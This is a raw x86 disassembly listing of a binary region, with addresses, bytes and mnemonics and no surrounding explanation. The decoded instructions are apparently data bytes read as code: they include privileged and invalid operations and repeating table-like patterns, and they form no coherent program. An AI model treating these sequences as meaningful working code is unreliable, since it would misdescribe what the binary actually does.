  4062f7:	02 b9 00 2a 19 a2    	add    -0x5de6d600(%ecx),%bh
  4062fd:	02 b9 00 38 19 35    	add    0x35193800(%ecx),%bh
  406303:	00 24 00             	add    %ah,(%eax,%eax,1)
  406306:	3e 19 85 04 e9 00 47 	sbb    %eax,%ds:0x4700e904(%ebp)
  40630d:	19 f0                	sbb    %esi,%eax
  40630f:	00 c9                	add    %cl,%cl
  406311:	01 51 19             	add    %edx,0x19(%ecx)
  406314:	35 00 c9 01 59       	xor    $0x5901c900,%eax
  406319:	19 f0                	sbb    %esi,%eax
  40631b:	00 c9                	add    %cl,%cl
  40631d:	01 62 19             	add    %esp,0x19(%edx)
  406320:	f0 00 c9             	lock add %cl,%cl
  406323:	01 6f 19             	add    %ebp,0x19(%edi)
  406326:	8b 04 b9             	mov    (%ecx,%edi,4),%eax
  406329:	02 27                	add    (%edi),%ah
  40632b:	02 91 04 c9 01 82    	add    -0x7dfe36fc(%ecx),%dl
  406331:	19 9b 04 e9 00 27    	sbb    %ebx,0x2700e904(%ebx)
  406337:	02 35 00 e9 00 9c    	add    0x9c00e900,%dh
  40633d:	19 a2 04 c9 01 a6    	sbb    %esp,-0x59fe36fc(%edx)
  406343:	19 78 04             	sbb    %edi,0x4(%eax)
  406346:	c9                   	leave
  406347:	01 b4 19 5d 03 24 00 	add    %esi,0x24035d(%ecx,%ebx,1)
  40634e:	8d 16                	lea    (%esi),%edx
  406350:	ec                   	in     (%dx),%al
  406351:	00 d9                	add    %bl,%cl
  406353:	00 bd 19 ec 00 d9    	add    %bh,-0x26ff13e7(%ebp)
  406359:	00 df                	add    %bl,%bh
  40635b:	19 a9 04 29 02 ee    	sbb    %ebp,-0x11fdd6fc(%ecx)
  406361:	19 6a 03             	sbb    %ebp,0x3(%edx)
  406364:	d9 02                	flds   (%edx)
  406366:	43                   	inc    %ebx
  406367:	17                   	pop    %ss
  406368:	35 00 24 00 15       	xor    $0x15002400,%eax
  40636d:	1a f0                	sbb    %al,%dh
  40636f:	00 b9 00 1e 1a 35    	add    %bh,0x351a1e00(%ecx)
  406375:	00 19                	add    %bl,(%ecx)
  406377:	02 e9                	add    %cl,%ch
  406379:	16                   	push   %ss
  40637a:	ec                   	in     (%dx),%al
  40637b:	00 29                	add    %ch,(%ecx)
  40637d:	00 b7 14 47 03 d9    	add    %dh,-0x26fcb8ec(%edi)
  406383:	00 23                	add    %ah,(%ebx)
  406385:	1a ec                	sbb    %ah,%ch
  406387:	00 24 00             	add    %ah,(%eax,%eax,1)
  40638a:	28 15 af 04 24 00    	sub    %dl,0x2404af
  406390:	38 1a                	cmp    %bl,(%edx)
  406392:	b5 04                	mov    $0x4,%ch
  406394:	d9 00                	flds   (%eax)
  406396:	3f                   	aas
  406397:	1a 33                	sbb    (%ebx),%dh
  406399:	01 d9                	add    %ebx,%ecx
  40639b:	00 4c 1a 33          	add    %cl,0x33(%edx,%ebx,1)
  40639f:	01 d9                	add    %ebx,%ecx
  4063a1:	00 62 1a             	add    %ah,0x1a(%edx)
  4063a4:	ec                   	in     (%dx),%al
  4063a5:	00 d9                	add    %bl,%cl
  4063a7:	00 76 1a             	add    %dh,0x1a(%esi)
  4063aa:	ec                   	in     (%dx),%al
  4063ab:	00 e1                	add    %ah,%cl
  4063ad:	02 27                	add    (%edi),%ah
  4063af:	02 bc 04 e1 02 94 1a 	add    0x1a9402e1(%esp,%eax,1),%bh
  4063b6:	c3                   	ret
  4063b7:	04 e1                	add    $0xe1,%al
  4063b9:	02 a9 1a ec 00 e1    	add    -0x1eff13e6(%ecx),%ch
  4063bf:	02 b5 1a ec 00 99    	add    -0x66ff13e6(%ebp),%dh
  4063c5:	01 c1                	add    %eax,%ecx
  4063c7:	1a c7                	sbb    %bh,%al
  4063c9:	04 99                	add    $0x99,%al
  4063cb:	01 c8                	add    %ecx,%eax
  4063cd:	1a cf                	sbb    %bh,%cl
  4063cf:	04 d9                	add    $0xd9,%al
  4063d1:	00 cf                	add    %cl,%bh
  4063d3:	1a 33                	sbb    (%ebx),%dh
  4063d5:	01 f1                	add    %esi,%ecx
  4063d7:	02 f0                	add    %al,%dh
  4063d9:	1a d5                	sbb    %ch,%dl
  4063db:	04 31                	add    $0x31,%al
  4063dd:	00 27                	add    %ah,(%edi)
  4063df:	02 35 00 f9 02 44    	add    0x4402f900,%dh
  4063e5:	07                   	pop    %es
  4063e6:	07                   	pop    %es
  4063e7:	05 2c 00 27 02       	add    $0x227002c,%eax
  4063ec:	35 00 34 00 b9       	xor    $0xb9003400,%eax
  4063f1:	16                   	push   %ss
  4063f2:	e2 03                	loop   0x4063f7
  4063f4:	3c 00                	cmp    $0x0,%al
  4063f6:	c7                   	(bad)
  4063f7:	16                   	push   %ss
  4063f8:	f4                   	hlt
  4063f9:	03 01                	add    (%ecx),%eax
  4063fb:	01 04 1b             	add    %eax,(%ebx,%ebx,1)
  4063fe:	33 01                	xor    (%ecx),%eax
  406400:	01 03                	add    %eax,(%ebx)
  406402:	39 1b                	cmp    %ebx,(%ebx)
  406404:	27                   	daa
  406405:	05 01 03 4b 1b       	add    $0x1b4b0301,%eax
  40640a:	30 05 01 03 53 1b    	xor    %al,0x1b530301
  406410:	06                   	push   %es
  406411:	01 01                	add    %eax,(%ecx)
  406413:	03 5f 1b             	add    0x1b(%edi),%ebx
  406416:	37                   	aaa
  406417:	05 11 03 3d 13       	add    $0x133d0311,%eax
  40641c:	33 01                	xor    (%ecx),%eax
  40641e:	99                   	cltd
  40641f:	01 c8                	add    %ecx,%eax
  406421:	1a 3d 05 01 03 73    	sbb    0x73030105,%bh
  406427:	1b 44 05 01          	sbb    0x1(%ebp,%eax,1),%eax
  40642b:	03 83 1b 4e 05 01    	add    0x1054e1b(%ebx),%eax
  406431:	03 c4                	add    %esp,%eax
  406433:	1b 54 05 19          	sbb    0x19(%ebp,%eax,1),%edx
  406437:	03 d3                	add    %ebx,%edx
  406439:	1b 68 05             	sbb    0x5(%eax),%ebp
  40643c:	01 01                	add    %eax,(%ecx)
  40643e:	16                   	push   %ss
  40643f:	0c 33                	or     $0x33,%al
  406441:	01 99 01 c1 1a 6e    	add    %ebx,0x6e1ac101(%ecx)
  406447:	05 31 00 ad 0a       	add    $0xaad0031,%eax
  40644c:	33 01                	xor    (%ecx),%eax
  40644e:	39 03                	cmp    %eax,(%ebx)
  406450:	e2 1b                	loop   0x40646d
  406452:	75 05                	jne    0x406459
  406454:	01 03                	add    %eax,(%ebx)
  406456:	ed                   	in     (%dx),%eax
  406457:	1b 7d 05             	sbb    0x5(%ebp),%edi
  40645a:	f9                   	stc
  40645b:	00 27                	add    %ah,(%edi)
  40645d:	02 8b 05 2c 00 28    	add    0x28002c05(%ebx),%cl
  406463:	15 90 05 01 03       	adc    $0x3010590,%eax
  406468:	00 1c 98             	add    %bl,(%eax,%ebx,4)
  40646b:	05 99 01 c1 1a       	add    $0x1ac10199,%eax
  406470:	a2 05 01 01 f4       	mov    %al,0xf4010105
  406475:	16                   	push   %ss
  406476:	33 01                	xor    (%ecx),%eax
  406478:	99                   	cltd
  406479:	01 0e                	add    %ecx,(%esi)
  40647b:	1c a8                	sbb    $0xa8,%al
  40647d:	05 31 00 1a 0b       	add    $0xb1a0031,%eax
  406482:	37                   	aaa
  406483:	01 01                	add    %eax,(%ecx)
  406485:	01 1a                	add    %ebx,(%edx)
  406487:	1c 60                	sbb    $0x60,%al
  406489:	02 31                	add    (%ecx),%dh
  40648b:	00 f6                	add    %dh,%dh
  40648d:	0a 37                	or     (%edi),%dh
  40648f:	01 31                	add    %esi,(%ecx)
  406491:	00 84 0a 18 02 31 00 	add    %al,0x310218(%edx,%ecx,1)
  406498:	df 0a                	fisttps (%edx)
  40649a:	27                   	daa
  40649b:	02 11                	add    (%ecx),%dl
  40649d:	01 27                	add    %esp,(%edi)
  40649f:	02 35 00 99 01 35    	add    0x35019900,%dh
  4064a5:	1c f1                	sbb    $0xf1,%al
  4064a7:	05 11 01 41 1c       	add    $0x1c410111,%eax
  4064ac:	4f                   	dec    %edi
  4064ad:	04 09                	add    $0x9,%al
  4064af:	01 27                	add    %esp,(%edi)
  4064b1:	02 f6                	add    %dh,%dh
  4064b3:	05 51 03 fb 05       	add    $0x5fb0351,%eax
  4064b8:	0e                   	push   %cs
  4064b9:	06                   	push   %es
  4064ba:	59                   	pop    %ecx
  4064bb:	03 6e 1c             	add    0x1c(%esi),%ebp
  4064be:	15 06 51 03 1a       	adc    $0x1a035106,%eax
  4064c3:	0b d5                	or     %ebp,%edx
  4064c5:	04 11                	add    $0x11,%al
  4064c7:	01 76 1c             	add    %esi,0x1c(%esi)
  4064ca:	ec                   	in     (%dx),%al
  4064cb:	00 11                	add    %dl,(%ecx)
  4064cd:	01 15 1a f0 00 51    	add    %edx,0x5100f01a
  4064d3:	03 f6                	add    %esi,%esi
  4064d5:	0a 1b                	or     (%ebx),%bl
  4064d7:	06                   	push   %es
  4064d8:	59                   	pop    %ecx
  4064d9:	03 81 1c 20 06 99    	add    -0x66f9dfe4(%ecx),%eax
  4064df:	01 76 1c             	add    %esi,0x1c(%esi)
  4064e2:	ec                   	in     (%dx),%al
  4064e3:	00 c9                	add    %cl,%cl
  4064e5:	01 44 07 35          	add    %eax,0x35(%edi,%eax,1)
  4064e9:	00 69 03             	add    %ch,0x3(%ecx)
  4064ec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4064ed:	1c 37                	sbb    $0x37,%al
  4064ef:	06                   	push   %es
  4064f0:	69 03 df 0b 69 02    	imul   $0x2690bdf,(%ebx),%eax
  4064f6:	69 03 f2 0b 69 02    	imul   $0x2690bf2,(%ebx),%eax
  4064fc:	21 01                	and    %eax,(%ecx)
  4064fe:	b7 1c                	mov    $0x1c,%bh
  406500:	3d 06 39 00 27       	cmp    $0x27003906,%eax
  406505:	02 35 00 f9 00 bf    	add    0xbf00f900,%dh
  40650b:	1c 43                	sbb    $0x43,%al
  40650d:	06                   	push   %es
  40650e:	29 01                	sub    %eax,(%ecx)
  406510:	27                   	daa
  406511:	02 71 03             	add    0x3(%ecx),%dh
  406514:	71 03                	jno    0x406519
  406516:	27                   	daa
  406517:	02 37                	add    (%edi),%dh
  406519:	01 79 03             	add    %edi,0x3(%ecx)
  40651c:	27                   	daa
  40651d:	02 35 00 89 03 7e    	add    0x7e038900,%dh
  406523:	1d ec 00 44 00       	sbb    $0x4400ec,%eax
  406528:	3e 19 85 04 a1 03 88 	sbb    %eax,%ds:-0x77fc5efc(%ebp)
  40652f:	1d 6b 06 49 03       	sbb    $0x349066b,%eax
  406534:	96                   	xchg   %eax,%esi
  406535:	1d 33 01 31 00       	sbb    $0x310133,%eax
  40653a:	0b 0b                	or     (%ebx),%ecx
  40653c:	37                   	aaa
  40653d:	01 4c 00 3e          	add    %ecx,0x3e(%eax,%eax,1)
  406541:	19 85 04 91 03 a2    	sbb    %eax,-0x5dfc6efc(%ebp)
  406547:	1d 06 01 a9 03       	sbb    $0x3a90106,%eax
  40654c:	c2 1d 06             	ret    $0x61d
  40654f:	01 f1                	add    %esi,%ecx
  406551:	02 c6                	add    %dh,%al
  406553:	1d d5 04 81 03       	sbb    $0x38104d5,%eax
  406558:	27                   	daa
  406559:	02 a2 02 b1 03 27    	add    0x2703b102(%edx),%ah
  40655f:	02 38                	add    (%eax),%bh
  406561:	04 d9                	add    $0xd9,%al
  406563:	01 f8                	add    %edi,%eax
  406565:	1d 79 06 b9 03       	sbb    $0x3b90679,%eax
  40656a:	4f                   	dec    %edi
  40656b:	1e                   	push   %ds
  40656c:	80 06 c1             	addb   $0xc1,(%esi)
  40656f:	03 6d 1e             	add    0x1e(%ebp),%ebp
  406572:	88 06                	mov    %al,(%esi)
  406574:	c1 03 80             	roll   $0x80,(%ebx)
  406577:	1e                   	push   %ds
  406578:	35 00 d1 03 90       	xor    $0x9003d100,%eax
  40657d:	1e                   	push   %ds
  40657e:	8f 06                	pop    (%esi)
  406580:	d1 03                	roll   $1,(%ebx)
  406582:	97                   	xchg   %eax,%edi
  406583:	1e                   	push   %ds
  406584:	95                   	xchg   %eax,%ebp
  406585:	06                   	push   %es
  406586:	d1 03                	roll   $1,(%ebx)
  406588:	b2 1e                	mov    $0x1e,%dl
  40658a:	9c                   	pushf
  40658b:	06                   	push   %es
  40658c:	d9 03                	flds   (%ebx)
  40658e:	be 1e a2 06 54       	mov    $0x5406a21e,%esi
  406593:	00 27                	add    %ah,(%edi)
  406595:	02 38                	add    (%eax),%bh
  406597:	04 44                	add    $0x44,%al
  406599:	00 d7                	add    %dl,%bh
  40659b:	1e                   	push   %ds
  40659c:	b6 06                	mov    $0x6,%dh
  40659e:	5c                   	pop    %esp
  40659f:	00 27                	add    %ah,(%edi)
  4065a1:	02 35 00 51 03 e5    	add    0xe5035100,%dh
  4065a7:	1e                   	push   %ds
  4065a8:	c9                   	leave
  4065a9:	06                   	push   %es
  4065aa:	5c                   	pop    %esp
  4065ab:	00 28                	add    %ch,(%eax)
  4065ad:	15 af 04 51 03       	adc    $0x35104af,%eax
  4065b2:	ad                   	lods   %ds:(%esi),%eax
  4065b3:	0a cd                	or     %ch,%cl
  4065b5:	06                   	push   %es
  4065b6:	5c                   	pop    %esp
  4065b7:	00 fb                	add    %bh,%bl
  4065b9:	1e                   	push   %ds
  4065ba:	35 00 4c 00 27       	xor    $0x27004c00,%eax
  4065bf:	02 35 00 4c 00 d7    	add    0xd7004c00,%dh
  4065c5:	1e                   	push   %ds
  4065c6:	b6 06                	mov    $0x6,%dh
  4065c8:	99                   	cltd
  4065c9:	01 04 1f             	add    %eax,(%edi,%ebx,1)
  4065cc:	d1 06                	roll   $1,(%esi)
  4065ce:	99                   	cltd
  4065cf:	01 1d 1f d8 06 99    	add    %ebx,0x9906d81f
  4065d5:	01 3b                	add    %edi,(%ebx)
  4065d7:	1f                   	pop    %ds
  4065d8:	e0 06                	loopne 0x4065e0
  4065da:	f9                   	stc
  4065db:	02 44 07 eb          	add    -0x15(%edi,%eax,1),%al
  4065df:	06                   	push   %es
  4065e0:	99                   	cltd
  4065e1:	01 62 1f             	add    %esp,0x1f(%edx)
  4065e4:	f8                   	clc
  4065e5:	06                   	push   %es
  4065e6:	09 04 83             	or     %eax,(%ebx,%eax,4)
  4065e9:	1f                   	pop    %ds
  4065ea:	c9                   	leave
  4065eb:	06                   	push   %es
  4065ec:	49                   	dec    %ecx
  4065ed:	02 9b 1f fe 06 19    	add    0x1906fe1f(%ebx),%bl
  4065f3:	04 be                	add    $0xbe,%al
  4065f5:	1f                   	pop    %ds
  4065f6:	05 07 21 04 27       	add    $0x27042107,%eax
  4065fb:	02 0b                	add    (%ebx),%cl
  4065fd:	07                   	pop    %es
  4065fe:	29 04 df             	sub    %eax,(%edi,%ebx,8)
  406601:	1f                   	pop    %ds
  406602:	33 01                	xor    (%ecx),%eax
  406604:	31 04 ee             	xor    %eax,(%esi,%ebp,8)
  406607:	1f                   	pop    %ds
  406608:	15 07 99 01 c8       	adc    $0xc8019907,%eax
  40660d:	1a 1b                	sbb    (%ebx),%bl
  40660f:	07                   	pop    %es
  406610:	d1 03                	roll   $1,(%ebx)
  406612:	fb                   	sti
  406613:	1f                   	pop    %ds
  406614:	21 07                	and    %eax,(%edi)
  406616:	39 04 27             	cmp    %eax,(%edi,%eiz,1)
  406619:	02 37                	add    (%edi),%dh
  40661b:	01 39                	add    %edi,(%ecx)
  40661d:	04 2a                	add    $0x2a,%al
  40661f:	20 28                	and    %ch,(%eax)
  406621:	07                   	pop    %es
  406622:	49                   	dec    %ecx
  406623:	04 36                	add    $0x36,%al
  406625:	20 06                	and    %al,(%esi)
  406627:	01 41 04             	add    %eax,0x4(%ecx)
  40662a:	52                   	push   %edx
  40662b:	20 2f                	and    %ch,(%edi)
  40662d:	07                   	pop    %es
  40662e:	51                   	push   %ecx
  40662f:	04 8d                	add    $0x8d,%al
  406631:	16                   	push   %ss
  406632:	ec                   	in     (%dx),%al
  406633:	00 59 04             	add    %bl,0x4(%ecx)
  406636:	64 20 35 07 d1 03 6d 	and    %dh,%fs:0x6d03d107
  40663d:	20 21                	and    %ah,(%ecx)
  40663f:	07                   	pop    %es
  406640:	51                   	push   %ecx
  406641:	04 3e                	add    $0x3e,%al
  406643:	19 3c 07             	sbb    %edi,(%edi,%eax,1)
  406646:	61                   	popa
  406647:	04 82                	add    $0x82,%al
  406649:	20 33                	and    %dh,(%ebx)
  40664b:	01 99 01 62 1f 33    	add    %ebx,0x331f6201(%ecx)
  406651:	01 99 01 8c 20 33    	add    %ebx,0x33208c01(%ecx)
  406657:	01 d1                	add    %edx,%ecx
  406659:	03 6d 20             	add    0x20(%ebp),%ebp
  40665c:	43                   	inc    %ebx
  40665d:	07                   	pop    %es
  40665e:	d1 03                	roll   $1,(%ebx)
  406660:	9c                   	pushf
  406661:	20 4b 07             	and    %cl,0x7(%ebx)
  406664:	d1 03                	roll   $1,(%ebx)
  406666:	a8 20                	test   $0x20,%al
  406668:	21 07                	and    %eax,(%edi)
  40666a:	71 04                	jno    0x406670
  40666c:	27                   	daa
  40666d:	02 38                	add    (%eax),%bh
  40666f:	04 d1                	add    $0xd1,%al
  406671:	03 d6                	add    %esi,%edx
  406673:	20 52 07             	and    %dl,0x7(%edx)
  406676:	81 04 ed 20 74 07 d1 	addl   $0x351a1e03,-0x2ef88be0(,%ebp,8)
  40667d:	03 1e 1a 35 
  406681:	00 d1                	add    %dl,%cl
  406683:	03 0b                	add    (%ebx),%ecx
  406685:	21 79 07             	and    %edi,0x7(%ecx)
  406688:	89 04 35 21 7f 07 89 	mov    %eax,-0x76f880df(,%esi,1)
  40668f:	04 3f                	add    $0x3f,%al
  406691:	21 6b 06             	and    %ebp,0x6(%ebx)
  406694:	c1 03 7c             	roll   $0x7c,(%ebx)
  406697:	13 35 00 49 03 27    	adc    0x27034900,%esi
  40669d:	02 37                	add    (%edi),%dh
  40669f:	01 99 04 27 02 35    	add    %ebx,0x35022704(%ecx)
  4066a5:	00 08                	add    %cl,(%eax)
  4066a7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4066aa:	46                   	inc    %esi
  4066ab:	00 08                	add    %cl,(%eax)
  4066ad:	00 20                	add    %ah,(%eax)
  4066af:	00 4b 00             	add    %cl,0x0(%ebx)
  4066b2:	08 00                	or     %al,(%eax)
  4066b4:	24 00                	and    $0x0,%al
  4066b6:	50                   	push   %eax
  4066b7:	00 08                	add    %cl,(%eax)
  4066b9:	00 28                	add    %ch,(%eax)
  4066bb:	00 55 00             	add    %dl,0x0(%ebp)
  4066be:	08 00                	or     %al,(%eax)
  4066c0:	2c 00                	sub    $0x0,%al
  4066c2:	5a                   	pop    %edx
  4066c3:	00 08                	add    %cl,(%eax)
  4066c5:	00 30                	add    %dh,(%eax)
  4066c7:	00 5f 00             	add    %bl,0x0(%edi)
  4066ca:	08 00                	or     %al,(%eax)
  4066cc:	34 00                	xor    $0x0,%al
  4066ce:	64 00 08             	add    %cl,%fs:(%eax)
  4066d1:	00 38                	add    %bh,(%eax)
  4066d3:	00 69 00             	add    %ch,0x0(%ecx)
  4066d6:	08 00                	or     %al,(%eax)
  4066d8:	3c 00                	cmp    $0x0,%al
  4066da:	6e                   	outsb  %ds:(%esi),(%dx)
  4066db:	00 08                	add    %cl,(%eax)
  4066dd:	00 40 00             	add    %al,0x0(%eax)
  4066e0:	73 00                	jae    0x4066e2
  4066e2:	08 00                	or     %al,(%eax)
  4066e4:	44                   	inc    %esp
  4066e5:	00 78 00             	add    %bh,0x0(%eax)
  4066e8:	08 00                	or     %al,(%eax)
  4066ea:	48                   	dec    %eax
  4066eb:	00 7d 00             	add    %bh,0x0(%ebp)
  4066ee:	08 00                	or     %al,(%eax)
  4066f0:	4c                   	dec    %esp
  4066f1:	00 82 00 08 00 50    	add    %al,0x50000800(%edx)
  4066f7:	00 87 00 08 00 54    	add    %al,0x54000800(%edi)
  4066fd:	00 8c 00 08 00 58 00 	add    %cl,0x580008(%eax,%eax,1)
  406704:	91                   	xchg   %eax,%ecx
  406705:	00 08                	add    %cl,(%eax)
  406707:	00 5c 00 96          	add    %bl,-0x6a(%eax,%eax,1)
  40670b:	00 08                	add    %cl,(%eax)
  40670d:	00 64 00 9f          	add    %ah,-0x61(%eax,%eax,1)
  406711:	00 08                	add    %cl,(%eax)
  406713:	00 68 00             	add    %ch,0x0(%eax)
  406716:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406717:	00 08                	add    %cl,(%eax)
  406719:	00 6c 00 a9          	add    %ch,-0x57(%eax,%eax,1)
  40671d:	00 08                	add    %cl,(%eax)
  40671f:	00 70 00             	add    %dh,0x0(%eax)
  406722:	ae                   	scas   %es:(%edi),%al
  406723:	00 08                	add    %cl,(%eax)
  406725:	00 74 00 b3          	add    %dh,-0x4d(%eax,%eax,1)
  406729:	00 08                	add    %cl,(%eax)
  40672b:	00 78 00             	add    %bh,0x0(%eax)
  40672e:	b8 00 08 00 7c       	mov    $0x7c000800,%eax
  406733:	00 bd 00 08 00 80    	add    %bh,-0x7ffff800(%ebp)
  406739:	00 c2                	add    %al,%dl
  40673b:	00 2e                	add    %ch,(%esi)
  40673d:	00 2b                	add    %ch,(%ebx)
  40673f:	00 db                	add    %bl,%bl
  406741:	07                   	pop    %es
  406742:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  406746:	ea 07 2e 00 1b 00 db 	ljmp   $0xdb00,$0x1b002e07
  40674d:	07                   	pop    %es
  40674e:	2e 00 23             	add    %ah,%cs:(%ebx)
  406751:	00 db                	add    %bl,%bl
  406753:	07                   	pop    %es
  406754:	2e 00 33             	add    %dh,%cs:(%ebx)
  406757:	00 db                	add    %bl,%bl
  406759:	07                   	pop    %es
  40675a:	2e 00 3b             	add    %bh,%cs:(%ebx)
  40675d:	00 db                	add    %bl,%bl
  40675f:	07                   	pop    %es
  406760:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  406764:	db 07                	fildl  (%edi)
  406766:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  40676a:	e1 07                	loope  0x406773
  40676c:	83 00 9b             	addl   $0xffffff9b,(%eax)
  40676f:	00 46 00             	add    %al,0x0(%esi)
  406772:	63 02                	arpl   %eax,(%edx)
  406774:	03 09                	add    (%ecx),%ecx
  406776:	46                   	inc    %esi
  406777:	00 40 0e             	add    %al,0xe(%eax)
  40677a:	fb                   	sti
  40677b:	06                   	push   %es
  40677c:	46                   	inc    %esi
  40677d:	00 13                	add    %dl,(%ebx)
  40677f:	00 bc 02 65 00 be 02 	add    %bh,0x2be0065(%edx,%eax,1)
  406786:	d7                   	xlat   %ds:(%ebx)
  406787:	02 16                	add    (%esi),%dl
  406789:	03 23                	add    (%ebx),%esp
  40678b:	03 28                	add    (%eax),%ebp
  40678d:	03 c0                	add    %eax,%eax
  40678f:	03 01                	add    (%ecx),%eax
  406791:	04 27                	add    $0x27,%al
  406793:	04 2e                	add    $0x2e,%al
  406795:	04 6c                	add    $0x6c,%al
  406797:	04 d9                	add    $0xd9,%al
  406799:	04 ae                	add    $0xae,%al
  40679b:	05 ed 05 fe 05       	add    $0x5fe05ed,%eax
  4067a0:	0a 06                	or     (%esi),%al
  4067a2:	24 06                	and    $0x6,%al
  4067a4:	2d 06 49 06 85       	sub    $0x85064906,%eax
  4067a9:	07                   	pop    %es
  4067aa:	07                   	pop    %es
  4067ab:	00 01                	add    %al,(%ecx)
  4067ad:	00 0e                	add    %cl,(%esi)
  4067af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4067b2:	0f 00 0d 00 10 00 14 	str    0x14001000
  4067b9:	00 11                	add    %dl,(%ecx)
  4067bb:	00 1e                	add    %bl,(%esi)
  4067bd:	00 12                	add    %dl,(%edx)
  4067bf:	00 20                	add    %ah,(%eax)
  4067c1:	00 00                	add    %al,(%eax)
  4067c3:	00 8e 06 3c 01 00    	add    %cl,0x13c06(%esi)
  4067c9:	00 9e 06 41 01 00    	add    %bl,0x14106(%esi)
  4067cf:	00 a9 06 46 01 00    	add    %ch,0x14606(%ecx)
  4067d5:	00 b8 06 4b 01 00    	add    %bh,0x14b06(%eax)
  4067db:	00 c3                	add    %al,%bl
  4067dd:	06                   	push   %es
  4067de:	3c 01                	cmp    $0x1,%al
  4067e0:	00 00                	add    %al,(%eax)
  4067e2:	d3 06                	roll   %cl,(%esi)
  4067e4:	4f                   	dec    %edi
  4067e5:	01 00                	add    %eax,(%eax)
  4067e7:	00 e0                	add    %ah,%al
  4067e9:	06                   	push   %es
  4067ea:	41                   	inc    %ecx
  4067eb:	01 00                	add    %eax,(%eax)
  4067ed:	00 f6                	add    %dh,%dh
  4067ef:	06                   	push   %es
  4067f0:	41                   	inc    %ecx
  4067f1:	01 00                	add    %eax,(%eax)
  4067f3:	00 04 07             	add    %al,(%edi,%eax,1)
  4067f6:	46                   	inc    %esi
  4067f7:	01 00                	add    %eax,(%eax)
  4067f9:	00 13                	add    %dl,(%ebx)
  4067fb:	07                   	pop    %es
  4067fc:	41                   	inc    %ecx
  4067fd:	01 00                	add    %eax,(%eax)
  4067ff:	00 1e                	add    %bl,(%esi)
  406801:	07                   	pop    %es
  406802:	53                   	push   %ebx
  406803:	01 00                	add    %eax,(%eax)
  406805:	00 57 0b             	add    %dl,0xb(%edi)
  406808:	41                   	inc    %ecx
  406809:	02 00                	add    (%eax),%al
  40680b:	00 97 0c 80 02 00    	add    %dl,0x2800c(%edi)
  406811:	00 a3 0c 85 02 00    	add    %ah,0x2850c(%ebx)
  406817:	00 b2 0c 85 02 00    	add    %dh,0x2850c(%edx)
  40681d:	00 c3                	add    %al,%bl
  40681f:	0c 8b                	or     $0x8b,%al
  406821:	02 00                	add    (%eax),%al
  406823:	00 ce                	add    %cl,%dh
  406825:	0c 53                	or     $0x53,%al
  406827:	01 00                	add    %eax,(%eax)
  406829:	00 d3                	add    %dl,%bl
  40682b:	0c 91                	or     $0x91,%al
  40682d:	02 00                	add    (%eax),%al
  40682f:	00 26                	add    %ah,(%esi)
  406831:	0c 96                	or     $0x96,%al
  406833:	02 00                	add    (%eax),%al
  406835:	00 59 09             	add    %bl,0x9(%ecx)
  406838:	3c 01                	cmp    $0x1,%al
  40683a:	00 00                	add    %al,(%eax)
  40683c:	6e                   	outsb  %ds:(%esi),(%dx)
  40683d:	09 3c 01             	or     %edi,(%ecx,%eax,1)
  406840:	00 00                	add    %al,(%eax)
  406842:	83 09 3c             	orl    $0x3c,(%ecx)
  406845:	01 00                	add    %eax,(%eax)
  406847:	00 9a 09 3c 01 00    	add    %bl,0x13c09(%edx)
  40684d:	00 b1 09 3c 01 00    	add    %dh,0x13c09(%ecx)
  406853:	00 c6                	add    %al,%dh
  406855:	09 3c 01             	or     %edi,(%ecx,%eax,1)
  406858:	00 00                	add    %al,(%eax)
  40685a:	db 09                	fisttpl (%ecx)
  40685c:	3c 01                	cmp    $0x1,%al
  40685e:	00 00                	add    %al,(%eax)
  406860:	f2 09 3c 01          	repnz or %edi,(%ecx,%eax,1)
  406864:	00 00                	add    %al,(%eax)
  406866:	09 0a                	or     %ecx,(%edx)
  406868:	3c 01                	cmp    $0x1,%al
  40686a:	00 00                	add    %al,(%eax)
  40686c:	21 0a                	and    %ecx,(%edx)
  40686e:	3c 01                	cmp    $0x1,%al
  406870:	00 00                	add    %al,(%eax)
  406872:	22 0f                	and    (%edi),%cl
  406874:	4f                   	dec    %edi
  406875:	01 00                	add    %eax,(%eax)
  406877:	00 2d 0f 4b 01 00    	add    %ch,0x14b0f
  40687d:	00 22                	add    %ah,(%edx)
  40687f:	0f 4f 01             	cmovg  (%ecx),%eax
  406882:	00 00                	add    %al,(%eax)
  406884:	2d 0f 4b 01 02       	sub    $0x2014b0f,%eax
  406889:	00 05 00 03 00 01    	add    %al,0x1000300
  40688f:	00 06                	add    %al,(%esi)
  406891:	00 03                	add    %al,(%ebx)
  406893:	00 02                	add    %al,(%edx)
  406895:	00 07                	add    %al,(%edi)
  406897:	00 05 00 01 00 08    	add    %al,0x8000100
  40689d:	00 05 00 02 00 09    	add    %al,0x9000200
  4068a3:	00 07                	add    %al,(%edi)
  4068a5:	00 01                	add    %al,(%ecx)
  4068a7:	00 0a                	add    %cl,(%edx)
  4068a9:	00 07                	add    %al,(%edi)
  4068ab:	00 02                	add    %al,(%edx)
  4068ad:	00 0b                	add    %cl,(%ebx)
  4068af:	00 09                	add    %cl,(%ecx)
  4068b1:	00 01                	add    %al,(%ecx)
  4068b3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4068b6:	09 00                	or     %eax,(%eax)
  4068b8:	01 00                	add    %eax,(%eax)
  4068ba:	0f 00 0b             	str    (%ebx)
  4068bd:	00 02                	add    %al,(%edx)
  4068bf:	00 0e                	add    %cl,(%esi)
  4068c1:	00 0b                	add    %cl,(%ebx)
  4068c3:	00 02                	add    %al,(%edx)
  4068c5:	00 11                	add    %dl,(%ecx)
  4068c7:	00 0d 00 02 00 12    	add    %cl,0x12000200
  4068cd:	00 0f                	add    %cl,(%edi)
  4068cf:	00 02                	add    %al,(%edx)
  4068d1:	00 13                	add    %dl,(%ebx)
  4068d3:	00 11                	add    %dl,(%ecx)
  4068d5:	00 02                	add    %al,(%edx)
  4068d7:	00 18                	add    %bl,(%eax)
  4068d9:	00 13                	add    %dl,(%ebx)
  4068db:	00 01                	add    %al,(%ecx)
  4068dd:	00 19                	add    %bl,(%ecx)
  4068df:	00 13                	add    %dl,(%ebx)
  4068e1:	00 01                	add    %al,(%ecx)
  4068e3:	00 1b                	add    %bl,(%ebx)
  4068e5:	00 15 00 02 00 1a    	add    %dl,0x1a000200
  4068eb:	00 15 00 02 00 1c    	add    %dl,0x1c000200
  4068f1:	00 17                	add    %dl,(%edi)
